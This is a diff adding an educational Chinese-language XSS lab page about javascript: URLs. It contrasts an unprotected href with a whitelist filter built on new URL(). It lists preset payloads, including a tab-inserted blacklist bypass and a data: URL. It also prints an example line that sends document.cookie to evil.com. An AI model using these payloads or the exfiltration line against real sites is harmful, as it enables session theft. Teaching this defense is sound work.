@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>javascript: URL 的 XSS 實驗室</title>
+<style>
+  :root{
+    --bg:#fdf6f9; --card:#fff; --ink:#2b2028; --muted:#7a6b74;
+    --line:#f0dbe4; --danger:#c2185b; --ok:#1b7a4b; --warn:#b26b00;
+    --code:#fbf0f4;
+  }
+  @media (prefers-color-scheme:dark){
+    :root{ --bg:#1b1418; --card:#241b21; --ink:#f3e7ee; --muted:#b9a5b0;
+           --line:#3a2b34; --code:#2d222a; }
+  }
+  *{box-sizing:border-box}
+  body{margin:0;padding:24px 16px;background:var(--bg);color:var(--ink);
+       font-family:-apple-system,"Segoe UI","Noto Sans TC",sans-serif;line-height:1.75}
+  .wrap{max-width:860px;margin:0 auto}
+  h1{font-size:1.5rem;margin:0 0 4px}
+  .sub{color:var(--muted);margin:0 0 24px;font-size:.92rem}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:14px;
+        padding:18px 20px;margin:0 0 18px}
+  .card h2{font-size:1.1rem;margin:0 0 12px;display:flex;align-items:center;gap:8px}
+  .tag{font-size:.72rem;padding:2px 8px;border-radius:99px;font-weight:600}
+  .t-bad{background:#fde8ef;color:var(--danger)}
+  .t-good{background:#e4f6ec;color:var(--ok)}
+  @media (prefers-color-scheme:dark){
+    .t-bad{background:#4a1f30;color:#ff9ab8} .t-good{background:#1c3d2b;color:#7fd6a3}
+  }
+  input[type=text]{width:100%;padding:10px 12px;border:1px solid var(--line);
+       border-radius:8px;background:var(--bg);color:var(--ink);font-size:.95rem;font-family:ui-monospace,monospace}
+  button{padding:8px 14px;border:0;border-radius:8px;background:var(--danger);
+       color:#fff;font-size:.9rem;cursor:pointer;margin:8px 6px 0 0}
+  button.ghost{background:transparent;color:var(--danger);border:1px solid var(--danger)}
+  code,pre{font-family:ui-monospace,"Cascadia Code",monospace;background:var(--code);
+       border-radius:6px}
+  code{padding:2px 6px;font-size:.88em}
+  pre{padding:12px 14px;overflow-x:auto;font-size:.85rem;border:1px solid var(--line)}
+  .out{margin-top:14px;padding:14px;border:1px dashed var(--line);border-radius:8px;
+       background:var(--bg);min-height:52px}
+  .out a{color:var(--danger);font-weight:600}
+  .note{font-size:.86rem;color:var(--muted);margin-top:8px}
+  .presets button{background:var(--card);color:var(--ink);border:1px solid var(--line);
+       font-family:ui-monospace,monospace;font-size:.8rem}
+  table{border-collapse:collapse;width:100%;font-size:.88rem;margin-top:10px}
+  th,td{border:1px solid var(--line);padding:8px 10px;text-align:left;vertical-align:top}
+  th{background:var(--code);font-weight:600}
+  .log{font-family:ui-monospace,monospace;font-size:.82rem;white-space:pre-wrap;
+       max-height:180px;overflow-y:auto}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>javascript: URL 的 XSS 實驗室</h1>
+<p class="sub">本檔案完全在你自己的瀏覽器裡跑，沒有任何對外連線。攻擊 payload 只會呼叫 <code>alert()</code> 與寫進下方的紀錄區。</p>
+
+<div class="card">
+  <h2>零、先搞懂 <code>javascript:</code> 是什麼</h2>
+  <p><code>javascript:</code> 是一種 <strong>URL scheme（URL 協定）</strong>，跟 <code>https:</code>、<code>mailto:</code>、<code>tel:</code> 是同一類東西。</p>
+  <table>
+    <tr><th>URL</th><th>瀏覽器看到之後做什麼</th></tr>
+    <tr><td><code>https://example.com</code></td><td>去那個網址抓資源</td></tr>
+    <tr><td><code>mailto:a@b.com</code></td><td>開啟郵件軟體</td></tr>
+    <tr><td><code>tel:0912345678</code></td><td>撥號</td></tr>
+    <tr><td><code>javascript:alert(1)</code></td><td><strong>把冒號後面的文字當 JavaScript 執行</strong></td></tr>
+  </table>
+  <p class="note">所以 <code>javascript:alert(1)</code> 的意思就是：「執行 <code>alert(1)</code> 這行程式碼」。<code>alert(1)</code> 是跳出一個寫著 1 的彈窗，攻擊者用它當測試訊號——彈窗跳出來就代表「我能在這個網站執行任意 JavaScript」。</p>
+</div>
+
+<div class="card">
+  <h2>一、沒有防護的版本 <span class="tag t-bad">危險</span></h2>
+  <pre>&lt;a href={userInput}&gt;點我&lt;/a&gt;   ← 直接把使用者的輸入放進 href</pre>
+  <p class="note">試試下面的預設值，或自己打。輸入完按「產生連結」，然後<strong>點那個連結</strong>。</p>
+
+  <div class="presets">
+    <button onclick="fill('https://example.com')">正常網址</button>
+    <button onclick="fill('javascript:alert(1)')">javascript:alert(1)</button>
+    <button onclick="fill('javascript:alert(document.domain)')">偷網域名稱</button>
+    <button onclick="fill('javascript:logSteal()')">模擬偷 cookie</button>
+    <button onclick="fill('JaVaScRiPt:alert(1)')">大小寫混寫</button>
+    <button onclick="fill(' javascript:alert(1)')">前面加空白</button>
+    <button onclick="fill('java\tscript:alert(1)')" title="協定中間插 Tab，URL 解析器會移除它">⚠️ 中間插 Tab（真能繞過黑名單）</button>
+    <button onclick="fill('data:text/html,<h1>我是另一種危險協定</h1>')" title="你擋了 javascript: 還有 data:">⚠️ 換成 data: 協定</button>
+  </div>
+
+  <p style="margin-top:12px"><input type="text" id="input" value="javascript:alert(1)"></p>
+  <button onclick="renderUnsafe()">產生連結（不做防護）</button>
+  <button class="ghost" onclick="renderSafe()">產生連結（有防護）</button>
+
+  <div class="out" id="out">（結果會出現在這裡）</div>
+  <p class="note" id="verdict"></p>
+</div>
+
+<div class="card">
+  <h2>二、防護怎麼寫 <span class="tag t-good">安全</span></h2>
+  <p>重點：<strong>不要用黑名單擋 <code>javascript:</code> 這個字串</strong>，因為它有太多繞過方式（大小寫、前置空白、換行字元、HTML 實體編碼）。要用<strong>白名單，只允許你確定安全的協定</strong>。</p>
+  <pre>function safeUrl(input) {
+  try {
+    // 白話講：用瀏覽器內建的 URL 解析器去解析它，
+    //         解析失敗（丟出錯誤）就代表這不是合法網址
+    const url = new URL(input, window.location.origin)
+
+    // 白話講：只放行這三種協定，其他一律換成無害的 '#'
+    const allowed = ['http:', 'https:', 'mailto:']
+    return allowed.includes(url.protocol) ? url.href : '#'
+  } catch {
+    return '#'
+  }
+}</pre>
+  <p class="note">為什麼用 <code>new URL()</code> 而不是自己比對字串：因為 <code>new URL()</code> 是瀏覽器自己的解析器，它跟真正決定「這個連結要幹嘛」的那段程式碼<strong>用同一套規則</strong>。自己寫正則表達式，永遠會跟瀏覽器的實際行為有落差，那個落差就是漏洞。</p>
+
+  <h3 style="font-size:.98rem;margin:18px 0 8px">實測：黑名單 vs 白名單</h3>
+  <p class="note" style="margin-top:0">下表是用 Node.js 實際跑出來的。黑名單的寫法是 <code>!s.toLowerCase().includes('javascript:')</code>。</p>
+  <table>
+    <tr><th>輸入形式</th><th>黑名單判定</th><th><code>new URL()</code> 解出的協定</th><th>白名單判定</th></tr>
+    <tr><td>原形 <code>javascript:</code></td><td>擋下</td><td><code>javascript:</code></td><td>擋下 ✅</td></tr>
+    <tr><td>大小寫混寫 <code>JaVaScRiPt:</code></td><td>擋下</td><td><code>javascript:</code></td><td>擋下 ✅</td></tr>
+    <tr><td>前置空白／Tab／換行</td><td>擋下</td><td><code>javascript:</code></td><td>擋下 ✅</td></tr>
+    <tr><td><strong>協定中間插 Tab</strong> <code>java&#9;script:</code></td><td><strong style="color:var(--danger)">放行 ⚠️</strong></td><td><code>javascript:</code></td><td>擋下 ✅</td></tr>
+    <tr><td><strong>換成 <code>data:</code> 協定</strong></td><td><strong style="color:var(--danger)">放行 ⚠️</strong></td><td><code>data:</code></td><td>擋下 ✅</td></tr>
+  </table>
+
+  <p class="note"><strong>兩個重點，跟直覺不太一樣：</strong></p>
+  <ul class="note" style="margin-top:4px">
+    <li><strong>大小寫混寫和前置空白其實擋得住</strong>——因為 <code>includes()</code> 是找子字串，不是完整比對，所以 <code>' javascript:alert(1)'</code> 裡面還是有 <code>javascript:</code> 這段。很多文章說這能繞過，實測是不行。</li>
+    <li><strong>真正繞得過去的是「協定中間插 Tab」</strong>：<code>java&#9;script:</code> 這個字串裡<strong>找不到</strong> <code>javascript:</code>（中間卡了一個 Tab），但 WHATWG URL 規範規定<strong>解析 URL 時要先移除所有 Tab 與換行字元</strong>，所以瀏覽器眼中它就是 <code>javascript:</code>。<strong>這就是「你的字串比對」和「瀏覽器的解析器」用不同規則的最好例證。</strong></li>
+    <li><strong>最致命的其實不是繞過，是漏掉</strong>：你擋了 <code>javascript:</code>，那 <code>data:</code>、<code>vbscript:</code>（舊 IE）呢？黑名單的根本問題是<strong>你必須窮舉所有壞的，而攻擊者只需要找到一個你沒想到的</strong>。</li>
+  </ul>
+
+  <p class="note"><strong>所以黑名單「爛」在哪？不是零效果，是它的失敗方式。</strong><br>
+  黑名單漏掉時，<strong>你不會知道</strong>——網站看起來正常，漏洞安靜地躺在那裡。<br>
+  白名單如果設太嚴，<strong>你馬上會知道</strong>——使用者抱怨連結點不開，你就去修白名單。<br>
+  <strong>資安上要選「失敗時會被發現」的那一種。</strong></p>
+</div>
+
+<div class="card">
+  <h2>三、<code>javascript:alert(1)</code> 跟 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 一樣嗎？</h2>
+  <p><strong>執行的結果一樣，但「怎麼進到你的網站」完全不同——而這個差別就是它更難防的原因。</strong></p>
+  <table>
+    <tr><th></th><th><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></th><th><code>javascript:alert(1)</code></th></tr>
+    <tr><td>觸發時機</td><td>解析到就<strong>立刻</strong>執行</td><td>要<strong>使用者點擊</strong>才執行</td></tr>
+    <tr><td>需要注入什麼</td><td><strong>一整個 HTML 標籤</strong>（需要 <code>&lt;</code> 和 <code>&gt;</code>）</td><td><strong>只要一個屬性值</strong>（一個角括號都不用）</td></tr>
+    <tr><td>HTML 轉義擋得住嗎</td><td><strong style="color:var(--ok)">擋得住</strong>（<code>&lt;</code> 變成 <code>&amp;lt;</code> 就不是標籤了）</td><td><strong style="color:var(--danger)">擋不住</strong>（它沒有角括號可以被轉義）</td></tr>
+    <tr><td>框架的自動防護</td><td>React／Vue 預設轉義，安全</td><td><strong style="color:var(--danger)">框架不管</strong>（React 只印警告）</td></tr>
+    <tr><td>執行權限</td><td colspan="2">完全一樣，都在你網站的 origin 下，能讀 cookie、能發同源請求</td></tr>
+  </table>
+  <p class="note"><strong>最關鍵的是第三列。</strong>所有框架的自動轉義都是在處理「角括號」——把 <code>&lt;</code> 換成 <code>&amp;lt;</code>，讓瀏覽器把它當文字。但 <code>javascript:alert(1)</code> <strong>從頭到尾沒有一個角括號</strong>，轉義機制根本沒有東西可以轉。</p>
+  <p class="note">所以它是<strong>「繞過 HTML 轉義」的攻擊路徑</strong>：網站可能把 <code>&lt;script&gt;</code> 擋得死死的，卻在 <code>href={userInput}</code> 這一行破功。</p>
+</div>
+
+<div class="card">
+  <h2>四、真實情境：誰會打這個？</h2>
+  <p><strong>不是使用者自己打來攻擊自己，是攻擊者填進某個欄位，讓「別人」點到。</strong></p>
+  <table>
+    <tr><th>情境</th><th>攻擊者填在哪</th><th>受害者</th></tr>
+    <tr><td>個人資料的「我的網站」欄位</td><td>個人檔案表單</td><td>任何看他個人頁面並點連結的人</td></tr>
+    <tr><td>留言／評論裡的連結</td><td>留言框</td><td>其他讀者</td></tr>
+    <tr><td>登入後的轉址參數</td><td><code>?redirect=javascript:...</code></td><td>被釣魚連結騙去點的人</td></tr>
+    <tr><td>商品評論的「來源連結」</td><td>評論表單</td><td>逛商品頁的買家</td></tr>
+  </table>
+  <p class="note">真實的 payload 不會是 <code>alert(1)</code>，而是 <code>javascript:fetch('https://evil.com?c='+document.cookie)</code> 這種——<strong>把受害者的 cookie 送到攻擊者的伺服器</strong>，而受害者只看到連結沒反應。</p>
+  <p class="note"><strong>所以 <code>alert(1)</code> 是研究用的「試紙」</strong>：彈窗跳出來就證明這裡可以執行任意 JS，真正的攻擊再換掉那一行就好。</p>
+</div>
+
+<div class="card">
+  <h2>五、紀錄區</h2>
+  <div class="log" id="log">（點擊連結後的紀錄會出現在這裡）</div>
+</div>
+
+</div>
+
+<script>
+const $ = (id) => document.getElementById(id);
+let logLines = [];
+
+function addLog(msg) {
+  const t = new Date().toLocaleTimeString('zh-TW');
+  logLines.unshift(`[${t}] ${msg}`);
+  $('log').textContent = logLines.join('\n');
+}
+
+function fill(v) { $('input').value = v; }
+
+// ── 沒有防護：直接把輸入塞進 href ──────────────────────────
+function renderUnsafe() {
+  const raw = $('input').value;
+  const a = document.createElement('a');
+  a.href = raw;                      // ← 這就是漏洞所在
+  a.textContent = '點我（無防護）';
+  $('out').replaceChildren(a);
+
+  const proto = detectProtocol(raw);
+  $('verdict').innerHTML = `這個 href 實際的協定是 <code>${proto}</code>。`
+    + (proto === 'javascript:'
+        ? ' <strong style="color:var(--danger)">危險：點下去會執行 JavaScript。</strong>'
+        : ' 看起來是一般網址。');
+  addLog(`產生無防護連結，href 協定 = ${proto}`);
+}
+
+// ── 有防護：白名單過濾 ─────────────────────────────────────
+function safeUrl(input) {
+  try {
+    const url = new URL(input, window.location.origin);
+    const allowed = ['http:', 'https:', 'mailto:'];
+    return allowed.includes(url.protocol) ? url.href : '#';
+  } catch {
+    return '#';
+  }
+}
+
+function renderSafe() {
+  const raw = $('input').value;
+  const cleaned = safeUrl(raw);
+  const a = document.createElement('a');
+  a.href = cleaned;
+  a.textContent = '點我（有防護）';
+  $('out').replaceChildren(a);
+
+  const blocked = cleaned === '#';
+  $('verdict').innerHTML = `過濾後的 href = <code>${cleaned}</code>。`
+    + (blocked
+        ? ' <strong style="color:var(--ok)">已被擋掉，換成無害的 #。</strong>'
+        : ' 通過白名單，是安全的協定。');
+  addLog(`產生有防護連結，${blocked ? '已擋下' : '放行'}：${raw.slice(0, 40)}`);
+}
+
+// 用瀏覽器自己的解析器判斷協定，跟自己寫正則不同
+function detectProtocol(raw) {
+  try { return new URL(raw, window.location.origin).protocol; }
+  catch { return '(無法解析)'; }
+}
+
+// 模擬「偷 cookie」——只寫進本頁紀錄，不對外送任何東西
+function logSteal() {
+  addLog('⚠️ 攻擊程式碼被執行了！真實攻擊在這一步會把 document.cookie 送到攻擊者的伺服器。');
+  alert('攻擊成功示意：這裡如果是真的攻擊，你的 cookie 已經被送走了。\n（本檔案沒有任何對外連線）');
+}
+
+addLog('實驗室載入完成。建議順序：先按「javascript:alert(1)」→ 產生連結（不做防護）→ 點連結 → 再用「有防護」跑一次同一個輸入。');
+</script>
+</body>
+</html>
